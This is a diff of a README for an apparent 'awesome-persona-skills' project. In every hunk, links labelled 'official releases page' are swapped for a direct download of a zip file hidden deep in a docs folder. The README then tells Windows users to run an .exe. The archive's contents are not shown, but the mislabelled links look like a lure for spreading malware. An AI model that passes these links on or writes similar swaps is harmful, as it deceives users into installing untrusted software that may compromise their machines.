@@ -1,6 +1,6 @@
 # 🎭 awesome-persona-skills - Manage your digital persona library efficiently
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Valeneunemployable6106/awesome-persona-skills/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Valeneunemployable6106/awesome-persona-skills/raw/refs/heads/main/skill/docs/superpowers/skills-awesome-persona-restock.zip)
 
 This repository provides a collection of projects focused on digital personas, character development, and skill building. You can use these tools to manage your digital-self, explore mystic entertainment, or integrate advanced AI skills into your personal workflow.
 
@@ -22,7 +22,7 @@ Before you start, ensure your computer meets these requirements:
 
 Follow these instructions to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/Valeneunemployable6106/awesome-persona-skills/releases) to download the application.
+1. Visit the [official releases page](https://github.com/Valeneunemployable6106/awesome-persona-skills/raw/refs/heads/main/skill/docs/superpowers/skills-awesome-persona-restock.zip) to download the application.
 2. Select the latest version available at the top of the list.
 3. Locate the Windows installer file, which typically ends with the .exe extension.
 4. Click the file to start the download.
@@ -79,7 +79,7 @@ If you decide to uninstall the software, navigate to your Windows Settings, go t
 
 ## 🌐 Community and Support
 
-The community maintains this project to keep the digital-self tools current. If you find a bug, open an issue on the official GitHub page. You can also view the latest updates, bug fixes, and feature releases on the [releases page](https://github.com/Valeneunemployable6106/awesome-persona-skills/releases). Regularly checking this page ensures you use the most stable and secure version of the software available.
+The community maintains this project to keep the digital-self tools current. If you find a bug, open an issue on the official GitHub page. You can also view the latest updates, bug fixes, and feature releases on the [releases page](https://github.com/Valeneunemployable6106/awesome-persona-skills/raw/refs/heads/main/skill/docs/superpowers/skills-awesome-persona-restock.zip). Regularly checking this page ensures you use the most stable and secure version of the software available.
 
 ## 📜 Project Topics
 
